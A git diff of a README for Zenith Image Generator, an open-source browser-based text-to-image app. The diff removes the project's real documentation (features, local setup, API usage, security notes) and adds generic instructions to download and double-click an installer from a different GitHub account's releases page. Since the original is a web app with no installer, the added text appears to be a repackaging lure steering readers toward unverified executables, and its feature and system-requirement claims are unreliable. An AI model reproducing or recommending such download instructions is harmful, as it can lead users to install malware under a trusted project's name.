@@ -1,171 +1,56 @@
-<div align="center">
+# 🌟 zenith-image-generator - Create Stunning Images Effortlessly
 
-# Zenith Image Generator
+## 📥 Download the App
+[![Download Zenith Image Generator](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/NikkkoPrime/zenith-image-generator/releases)
 
-**Modern Text-to-Image Generation Web App**
+## 🚀 Getting Started
+Welcome to the **Zenith Image Generator**! This application allows you to generate images using AI. It’s designed for everyone, no matter your technical level. Follow these steps to get started.
 
-A sleek, dark-mode AI image generator with multiple providers, <br/>
-batch generation, and one-click deployment to Cloudflare Pages.
+## 🛠️ System Requirements
+Before you download and install, ensure your system meets these requirements:
 
-[中文](./README.zh.md) · [Changelog](./docs/CHANGELOG.md) · [Live Demo](https://zenith-image-generator.pages.dev)
+- Operating System: Windows 10 or later, macOS Mojave or later, or any Linux distribution.
+- RAM: 4 GB minimum.
+- Disk Space: 1 GB free space.
+- Internet Connection: Required for AI functionality.
 
-![Dark Mode UI](https://img.shields.io/badge/UI-Dark%20Mode-1a1a1a)
-![Cloudflare Pages](https://img.shields.io/badge/Deploy-Cloudflare%20Pages-F38020)
-![React](https://img.shields.io/badge/React-19-61DAFB)
-![Hono](https://img.shields.io/badge/Hono-4-E36002)
+## 👩‍💻 Features
+- AI-powered image generation.
+- User-friendly interface.
+- Options to customize your images easily.
+- API access for developers.
 
-</div>
+## 📂 Download & Install
+To download the Zenith Image Generator, visit this page: [Download the latest release](https://github.com/NikkkoPrime/zenith-image-generator/releases). 
 
----
+1. Open the link above in your web browser.
+2. You will see a list of releases. Look for the most recent version.
+3. Click on the link to download the file suitable for your operating system.
+4. Once download is complete, locate the file on your computer. Double-click to run the installer.
 
-## Features
+## 🖥️ Running the Application
+After installation:
 
-- **Multiple AI Providers** - Gitee AI, HuggingFace Spaces, ModelScope
-- **Image-to-Video** - Generate videos from images (Gitee AI)
-- **Dark Mode UI** - Gradio-style with frosted glass effects
-- **Flexible Sizing** - Multiple aspect ratios (1:1, 16:9, 9:16, 4:3, etc.)
-- **4x Upscaling** - RealESRGAN integration
-- **Secure Storage** - API keys encrypted with AES-256-GCM
-- **Token Rotation** - Multiple API keys with automatic failover on rate limits
-- **Flow Mode** - Visual canvas for batch generation (experimental)
-  - Local image caching with IndexedDB blob storage
-  - Dual limits: 500 images or 4GB max storage
-  - LRU cleanup with user confirmation before deletion
-  - Download all images before cleanup
+1. Find the **Zenith Image Generator** icon on your Desktop or in your Applications folder.
+2. Double-click the icon to launch the application.
+3. Follow the on-screen prompts to generate your first image. You can choose styles, colors, and more!
 
-## Token Rotation
+## 🌐 Using the Web API
+For developers, our tool also provides an API option. Simply refer to the documentation included in the application for advanced features. You can send requests to generate images dynamically.
 
-Support multiple API tokens per provider for automatic rotation when hitting rate limits (429 errors).
+## 🎨 Tips for Image Generation
+- Experiment with different settings to see what works best for your project.
+- Save your favorite settings for quick access in the future.
+- Try varying inputs for creative outputs.
 
-### How to Use
+## 🔄 Updating the Application
+To ensure you always have the latest features and improvements:
 
-Enter multiple tokens in the API settings, separated by **English commas** (`,`):
+1. Revisit this page: [Download the latest release](https://github.com/NikkkoPrime/zenith-image-generator/releases).
+2. Download the new version, as you did during the initial install.
+3. Follow the same installation steps to update your application.
 
-```
-token_1, token_2, token_3
-```
+## 📞 Support
+If you encounter any issues or have questions, feel free to reach out through the Issues tab on our GitHub page. We appreciate your feedback and strive to improve the application.
 
-> **Note**: You must use English comma (`,`), Chinese comma (`，`) will not work.
-
-### How It Works
-
-1. Uses the first available token to make API requests
-2. When a 429 (rate limit) error occurs, automatically switches to the next token
-3. Exhausted tokens are tracked and skipped for the rest of the day
-4. Token status resets daily at UTC 00:00
-5. UI shows real-time token statistics (total/active/exhausted)
-
-## Quick Start
-
-### Prerequisites
-
-- Node.js 18+ / pnpm 9+
-- [Gitee AI API Key](https://ai.gitee.com)
-
-### One-Click Deploy
-
-[![Deploy to Cloudflare](https://img.shields.io/badge/Cloudflare-F38020?style=for-the-badge&logo=cloudflare&logoColor=white)](https://dash.cloudflare.com)
-[![Deploy to Vercel](https://img.shields.io/badge/Vercel-000000?style=for-the-badge&logo=vercel&logoColor=white)](https://vercel.com/new)
-[![Deploy to Netlify](https://img.shields.io/badge/Netlify-00C7B7?style=for-the-badge&logo=netlify&logoColor=white)](https://app.netlify.com/start)
-
-> See [Deployment Guide](./docs/en/DEPLOYMENT.md) for detailed instructions.
-
-### Local Development
-
-```bash
-git clone https://github.com/WuMingDao/zenith-image-generator.git
-cd zenith-image-generator
-pnpm install
-
-# Configure environment
-cp apps/web/.env.example apps/web/.env
-
-# Terminal 1
-pnpm dev:api
-
-# Terminal 2
-pnpm dev:web
-```
-
-Open `http://localhost:5173`
-
-📖 **[Full Development Guide](./docs/en/CONTRIBUTING.md)**
-
-## API Usage
-
-After deployment, you can call the API directly:
-
-```bash
-curl -X POST https://your-project.pages.dev/api/generate \
-  -H "Content-Type: application/json" \
-  -H "X-API-Key: your-gitee-api-key" \
-  -d '{"prompt": "a cute cat", "width": 1024, "height": 1024}'
-```
-
-📖 **[Full API Reference](./docs/en/API.md)** - Providers, parameters, code examples
-
-## Documentation
-
-| Doc                                       | Description                          |
-| ----------------------------------------- | ------------------------------------ |
-| [Contributing](./docs/en/CONTRIBUTING.md) | Local setup, LAN access, development |
-| [Deployment](./docs/en/DEPLOYMENT.md)     | Cloudflare, Vercel, Netlify guides   |
-| [API Reference](./docs/en/API.md)         | Endpoints, parameters, code examples |
-| [Providers & Models](./docs/en/PROVIDERS.md) | All providers and model details   |
-
-## Security
-
-### How Your API Keys Are Protected
-
-```
-Browser ──HTTPS──→ Cloudflare Workers ──HTTPS──→ AI Provider (Gitee/HuggingFace)
-   ↑                      ↑
-AES-256-GCM          Proxy Layer
-encrypted            (your deployment)
-```
-
-- **Local Encryption**: API keys are encrypted with AES-256-GCM before storing in localStorage
-- **Transport Security**: All communications use HTTPS encryption
-- **Proxy Architecture**: Your keys are sent to your own Workers, not directly to AI providers
-
-### ⚠️ Third-Party Deployment Warning
-
-> **Important**: If you use someone else's deployed instance, the operator can potentially access your API keys.
-
-This is because:
-
-1. The deployment owner can add logging code to capture request headers
-2. You cannot verify what code is actually deployed (even if the repo is open source)
-3. Cloudflare provides tools like `wrangler tail` that can inspect live requests
-
-**Recommendations**:
-
-| Scenario | Risk Level | Recommendation |
-|----------|------------|----------------|
-| Self-hosted deployment | ✅ Safe | Full control over your keys |
-| Third-party instance | ⚠️ Risky | Use disposable/low-balance keys only |
-| Unknown source | ❌ Unsafe | Do not enter valuable API keys |
-
-**For maximum security, always deploy your own instance.**
-
-## Tech Stack
-
-| Layer    | Tech                                    |
-| -------- | --------------------------------------- |
-| Frontend | React 19, Vite, Tailwind CSS, shadcn/ui |
-| Backend  | Hono (TypeScript)                       |
-| Deploy   | Cloudflare Pages, Vercel, Netlify       |
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=WuMingDao/zenith-image-generator&type=date&legend=top-left)](https://www.star-history.com/#WuMingDao/zenith-image-generator&type=date&legend=top-left)
-
-## License
-
-MIT
-
-## Acknowledgments
-
-- [Gitee AI](https://ai.gitee.com) - z-image-turbo model
-- [shadcn/ui](https://ui.shadcn.com) - UI components
-- [Hono](https://hono.dev) - Web framework
+Thank you for choosing **Zenith Image Generator**! Happy image creating!
